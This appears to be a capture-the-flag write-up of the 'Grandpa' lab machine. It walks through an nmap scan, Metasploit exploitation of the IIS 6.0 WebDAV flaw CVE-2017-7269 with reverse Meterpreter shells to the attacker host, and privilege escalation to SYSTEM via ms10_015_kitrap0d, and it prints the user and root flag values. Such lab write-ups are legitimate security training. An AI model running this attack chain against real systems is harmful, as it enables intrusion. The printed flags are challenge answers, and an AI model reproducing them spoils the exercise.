# Grandpa

## SYN Scan
```
nmap -sS -sV -O -p- -v -Pn -T4 -oA nmap/full_syn 10.10.10.14

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## RCE via Vulnerable IIS Version
`Microsoft IIS httpd 6.0` causes remote code execution.

CVE-2017-7269 => https://www.cvedetails.com/cve/CVE-2017-7269/

https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl

```
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
[+] 10.10.10.14:80 - The target is vulnerable.
```

```
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit

[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.10.10.14:1030) at 2021-03-28 18:02:02 +0300

meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

```
meterpreter > migrate 1820
[*] Migrating from 3576 to 1820...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

## Local Suggester
```
msf6 post(multi/recon/local_exploit_suggester) > exploit

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 37 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

## Privilege Escalation via ms10-015
```
msf6 exploit(windows/local/ms10_015_kitrap0d) > check
[*] The service is running, but could not be validated.
```

```
msf6 exploit(windows/local/ms10_015_kitrap0d) > exploit

[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] Launching notepad to host the exploit...
[+] Process 1136 launched.
[*] Reflectively injecting the exploit DLL into 1136...
[*] Injecting exploit into 1136 ...
[*] Exploit injected. Injecting payload into 1136...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.14.11:4444 -> 10.10.10.14:1031) at 2021-03-28 18:11:36 +0300

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## The User Flag
```
C:\Documents and Settings\Harry\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Harry\Desktop

04/12/2017  05:32 PM    <DIR>          .
04/12/2017  05:32 PM    <DIR>          ..
04/12/2017  05:32 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  18,065,788,928 bytes free
```

```
C:\Documents and Settings\Harry\Desktop>type user.txt
type user.txt
bdff5ec67c3cff017f2bedc146a5d869
```

## The Root Flag
```
C:\Documents and Settings\Administrator\Desktop>ir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Administrator\Desktop

04/12/2017  05:28 PM    <DIR>          .
04/12/2017  05:28 PM    <DIR>          ..
04/12/2017  05:29 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  18,066,690,048 bytes free
```

```
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
9359e905a2c35f861f6a57cecf28bb7b
```
